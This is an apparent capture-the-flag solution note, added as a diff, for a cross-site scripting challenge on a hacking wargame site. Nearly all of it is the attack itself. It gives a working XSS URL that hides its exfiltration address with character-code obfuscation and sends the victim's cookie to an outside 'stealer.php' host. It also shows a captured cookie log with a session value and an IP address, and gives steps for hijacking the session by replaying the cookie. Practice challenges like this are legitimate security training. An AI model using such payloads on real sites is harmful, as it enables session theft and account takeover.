@@ -1,0 +1,17 @@
+http://www.enigmagroup.org/missions/basics/xss/3/index.php?page=%3Cscript%3Edocument.location=String.fromCharCode%28104,%20116,%20116,%20112,%2058,%2047,%2047,%20121,%20104,%2097,%2099,%20107,%2046,%2098,%20121,%20117,%2046,%20101,%20100,%20117,%2047,%20115,%20116,%20101,%2097,%20108,%20101,%20114,%2046,%20112,%20104,%20112,%2063,%2099,%2061%29+document.cookie;%3C/script%3E
+
+that is yhack.byu.edu/stealer.php?c= encoded
+encode the parens and the < and >
+
+the cookie stolen is
+
+Cookie: SESSIONZ=fa515fd26b1a202c4d919c53c31bbbb5
+IP: 198.27.115.229
+Date and Time: Fri Apr 18 2014 9:27:14 MDT 
+Referer: http://www.enigmagroup.org/missions/basics/xss/3/logs.php
+
+that is the hash of 5e3af0
+
+However you don't need to crack the hash
+
+Just create the SESSIONZ cookie with the hash as the value and visit the index page of the challenge
